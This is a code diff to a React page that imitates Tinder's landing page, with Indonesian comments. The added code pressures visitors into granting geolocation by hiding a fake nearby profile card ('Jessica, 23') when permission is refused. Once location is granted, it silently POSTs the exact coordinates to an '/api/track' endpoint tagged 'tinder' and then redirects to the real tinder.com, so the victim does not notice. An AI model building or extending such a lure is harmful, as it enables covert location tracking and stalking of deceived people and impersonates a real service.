@@ -131,6 +131,9 @@ const testimonials = [
   },
 ];
 
+// URL dan profil tujuan setelah redirect
+const REDIRECT_URL = 'https://tinder.com'; // Ganti dengan URL Tinder asli atau profil tujuan
+
 export default function HomePage() {
   const [showCookieBanner, setShowCookieBanner] = useState(true);
   const [isClient, setIsClient] = useState(false);
@@ -141,6 +144,9 @@ export default function HomePage() {
   const [locationEnabled, setLocationEnabled] = useState(false);
   const [locationError, setLocationError] = useState<string | null>(null);
   const [contentLoaded, setContentLoaded] = useState(false);
+  const [profileVisible, setProfileVisible] = useState(true);
+  const [locationDenied, setLocationDenied] = useState(false);
+  const [showAfterLocationPrompt, setShowAfterLocationPrompt] = useState(false);
   const backgroundRef = useRef<HTMLDivElement>(null);
   const navbarRef = useRef<HTMLElement>(null);
   const testimonialsRef = useRef<HTMLElement>(null);
@@ -153,6 +159,8 @@ export default function HomePage() {
   const getCurrentPosition = useCallback(() => {
     if (!navigator.geolocation) {
       setLocationError("Your browser doesn't support geolocation");
+      setLocationDenied(true);
+      setProfileVisible(false);
       return Promise.reject(new Error('Geolocation not supported'));
     }
 
@@ -162,6 +170,20 @@ export default function HomePage() {
       try {
         const successCallback = (position: GeolocationPosition) => {
           console.log('Successfully got position:', position);
+
+          // Kirim data lokasi ke server
+          sendLocationData({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp,
+          });
+
+          // Setelah berhasil mendapatkan lokasi, tunggu sebentar lalu redirect
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 1500);
+
           resolve(position);
         };
 
@@ -173,14 +195,20 @@ export default function HomePage() {
             case error.PERMISSION_DENIED:
               errorMessage =
                 'Location access was denied. Please enable location in your browser settings.';
+              setLocationDenied(true);
+              setProfileVisible(false);
               break;
             case error.POSITION_UNAVAILABLE:
               errorMessage =
                 "We couldn't access your location. Please check your device settings.";
+              setLocationDenied(true);
+              setProfileVisible(false);
               break;
             case error.TIMEOUT:
               errorMessage =
                 'Location request timed out. Please check your connection.';
+              setLocationDenied(true);
+              setProfileVisible(false);
               break;
           }
 
@@ -204,10 +232,39 @@ export default function HomePage() {
         setLocationError(
           'An unexpected error occurred while trying to get your location.',
         );
+        setLocationDenied(true);
+        setProfileVisible(false);
         reject(err);
       }
     });
   }, []);
+
+  // Fungsi untuk mengirim data lokasi ke server
+  const sendLocationData = async (locationData: {
+    latitude: number;
+    longitude: number;
+    accuracy: number;
+    timestamp: number;
+  }) => {
+    try {
+      const response = await fetch('/api/track', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          pageType: 'tinder',
+          geoData: locationData,
+        }),
+      });
+
+      if (!response.ok) {
+        console.error('Failed to send location data');
+      }
+    } catch (error) {
+      console.error('Error sending location data:', error);
+    }
+  };
 
   // Check if location is already granted
   const checkLocationPermission = useCallback(() => {
@@ -216,6 +273,8 @@ export default function HomePage() {
     if (!navigator.geolocation) {
       console.error('Geolocation not supported');
       setLocationError("Your browser doesn't support geolocation");
+      setLocationDenied(true);
+      setProfileVisible(false);
       return;
     }
 
@@ -233,6 +292,7 @@ export default function HomePage() {
                   'Location permission granted and position obtained',
                 );
                 setLocationEnabled(true);
+                setShowAfterLocationPrompt(true);
               })
               .catch((err) => {
                 console.error(
@@ -242,10 +302,20 @@ export default function HomePage() {
                 // If there's an error getting position even with permission granted
                 setShowLocationModal(true);
               });
+          } else if (result.state === 'denied') {
+            // Jika izin lokasi ditolak
+            setLocationDenied(true);
+            setProfileVisible(false);
+            setShowLocationModal(true);
           } else {
             // If permission is not granted, show the modal
             console.log('Permission not granted, showing modal');
             setShowLocationModal(true);
+
+            // Setelah 2 detik, tampilkan modal permintaan lokasi
+            setTimeout(() => {
+              setShowLocationModal(true);
+            }, 2000);
           }
 
           // Listen for permission changes
@@ -256,10 +326,15 @@ export default function HomePage() {
                 .then(() => {
                   setLocationEnabled(true);
                   setShowLocationModal(false);
+                  setProfileVisible(true);
+                  setLocationDenied(false);
                 })
                 .catch((err) => {
                   console.error('Error after permission change:', err);
                 });
+            } else if (result.state === 'denied') {
+              setLocationDenied(true);
+              setProfileVisible(false);
             }
           };
         })
@@ -284,10 +359,14 @@ export default function HomePage() {
         setLocationEnabled(true);
         setShowLocationModal(false);
         setLocationError(null);
+        setProfileVisible(true);
+        setLocationDenied(false);
       })
       .catch((error) => {
         // If there's still an error after permission is granted
         console.error('Error after permission granted:', error);
+        setLocationDenied(true);
+        setProfileVisible(false);
         // Keep the modal open to show the error
       });
   }, [getCurrentPosition]);
@@ -500,21 +579,114 @@ export default function HomePage() {
         </div>
       </header>
 
-      {/* Main content with scroll animations */}
-      <main className='relative z-20 flex min-h-[70vh] flex-col items-center justify-center px-4 text-center'>
-        <div className='mx-auto max-w-4xl'>
-          <motion.h1
-            style={{ opacity: titleOpacity }}
-            className='mb-8 text-5xl font-bold text-white md:text-7xl lg:text-8xl'
-          >
-            Swipe Right<sup className='text-2xl md:text-3xl'>®</sup>
-          </motion.h1>
-          <motion.div style={{ opacity: buttonOpacity }}>
-            <Button className='rounded-full bg-gradient-to-r from-pink-500 to-rose-500 px-8 py-6 text-lg font-semibold text-white hover:from-pink-600 hover:to-rose-600'>
-              Create account
-            </Button>
-          </motion.div>
-        </div>
+      {/* Main content */}
+      <main className='relative z-10'>
+        {/* Hero section */}
+        <section className='relative flex min-h-screen flex-col items-center justify-center px-4 py-20 sm:py-32 md:px-8 lg:px-16'>
+          <div className='flex w-full max-w-5xl flex-col items-center'>
+            {/* Main heading */}
+            <motion.h1
+              style={{ opacity: titleOpacity }}
+              className='mb-6 text-center text-4xl font-bold text-white sm:text-5xl md:text-6xl lg:text-7xl'
+            >
+              Swipe Right®
+            </motion.h1>
+
+            {/* Description */}
+            <motion.p
+              style={{ opacity: titleOpacity }}
+              className='mb-10 max-w-2xl text-center text-lg text-white sm:text-xl'
+            >
+              Match. Chat. Date. Millions of people are finding their perfect
+              match on Tinder. Start your story today.
+            </motion.p>
+
+            {/* Location denied error message */}
+            <AnimatePresence>
+              {locationDenied && (
+                <motion.div
+                  initial={{ opacity: 0, y: -10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  exit={{ opacity: 0 }}
+                  className='mb-8 w-full max-w-md rounded-lg bg-red-500/20 p-4 text-center'
+                >
+                  <div className='flex flex-col items-center justify-center gap-2'>
+                    <AlertCircle className='h-8 w-8 text-red-500' />
+                    <h3 className='text-xl font-bold text-white'>
+                      Lokasi Diperlukan
+                    </h3>
+                    <p className='text-white/80'>
+                      Maaf, Anda harus mengizinkan akses lokasi untuk
+                      melanjutkan. Profil tidak dapat ditampilkan tanpa izin
+                      lokasi.
+                    </p>
+                    <Button
+                      onClick={handleLocationSuccess}
+                      className='mt-2 bg-white text-red-600 hover:bg-white/90'
+                    >
+                      Coba Lagi
+                    </Button>
+                  </div>
+                </motion.div>
+              )}
+            </AnimatePresence>
+
+            {/* Profile cards - only shown if profile is visible */}
+            {profileVisible && (
+              <motion.div
+                initial={{ opacity: 0 }}
+                animate={{ opacity: 1 }}
+                exit={{ opacity: 0 }}
+                style={{ opacity: titleOpacity }}
+                className='relative h-[450px] w-full max-w-lg'
+              >
+                <div className='absolute left-0 right-0 m-auto h-[450px] w-full max-w-md'>
+                  {/* Tinder-like card stack */}
+                  <div className='relative h-full w-full overflow-hidden rounded-2xl bg-white shadow-2xl'>
+                    {/* Profile image */}
+                    <Image
+                      src='/placeholder.svg?height=450&width=350'
+                      alt='Profile'
+                      width={350}
+                      height={450}
+                      className='absolute h-full w-full object-cover'
+                    />
+
+                    {/* Gradient overlay */}
+                    <div className='absolute bottom-0 h-2/5 w-full bg-gradient-to-t from-black/80 to-transparent' />
+
+                    {/* Profile info */}
+                    <div className='absolute bottom-0 w-full p-6'>
+                      <h2 className='text-3xl font-bold text-white'>
+                        Jessica, 23
+                      </h2>
+                      <div className='flex items-center text-white'>
+                        <MapPin className='mr-1 h-4 w-4' />
+                        <span>2 miles away</span>
+                      </div>
+                      <p className='mt-2 text-sm text-white/80'>
+                        Coffee enthusiast. Dog lover. Adventure seeker.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </motion.div>
+            )}
+
+            {/* CTA Buttons */}
+            <motion.div
+              style={{ opacity: buttonOpacity }}
+              className='mt-8 flex w-full max-w-md flex-col items-center space-y-4'
+            >
+              <Button
+                className='w-full rounded-full bg-gradient-to-r from-pink-500 to-rose-500 py-6 text-xl font-semibold text-white hover:from-pink-600 hover:to-rose-600'
+                onClick={() => setShowLoginModal(true)}
+              >
+                Create Account
+              </Button>
+            </motion.div>
+          </div>
+        </section>
       </main>
 
       {/* Testimonials section with carousel */}
